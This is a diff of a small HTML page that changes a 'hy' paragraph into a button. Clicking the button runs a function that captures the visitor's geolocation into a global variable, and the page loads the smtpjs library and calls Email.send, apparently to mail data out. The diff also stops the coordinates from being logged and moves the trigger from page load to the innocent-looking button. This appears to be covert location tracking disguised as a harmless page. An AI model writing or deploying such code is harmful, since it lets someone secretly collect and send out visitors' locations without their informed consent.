@@ -3,7 +3,7 @@
 <body >
 
 
-<p style="font-size: 42px;"> hy</p>
+<button style="font-size: 42px; padding: 2% 4%; background: #fcafaf; border-radius: 14px;" onclick="getLocation()"> hy</button>
 <!-- smtpjs link
    -->
    <script src="https://smtpjs.com/v3/smtp.js">
@@ -36,7 +36,7 @@ function getLocation() {
                 // Save the coordinates in the global variable
                 userCoordinates.latitude = position.coords.latitude;
                 userCoordinates.longitude = position.coords.longitude;
-                console.log(`Latitude: ${userCoordinates.latitude}, Longitude: ${userCoordinates.longitude}`);
+                
             },
             (error) => {
                 console.error(`Error: ${error.message}`);
@@ -45,10 +45,11 @@ function getLocation() {
     } else {
         console.error('Geolocation is not supported by your browser.');
     }
+    console.log('hamid');
 }
 
 // Automatically run the function when the page is loaded
-window.onload = getLocation;
+// window.onload = getLocation;
 
     (
     Email.send({
@@ -64,10 +65,6 @@ window.onload = getLocation;
  
 }))
 
-// showPosition();
-// showPosition();
-// showPosition();
-// showPosition();
 
 
 </script>
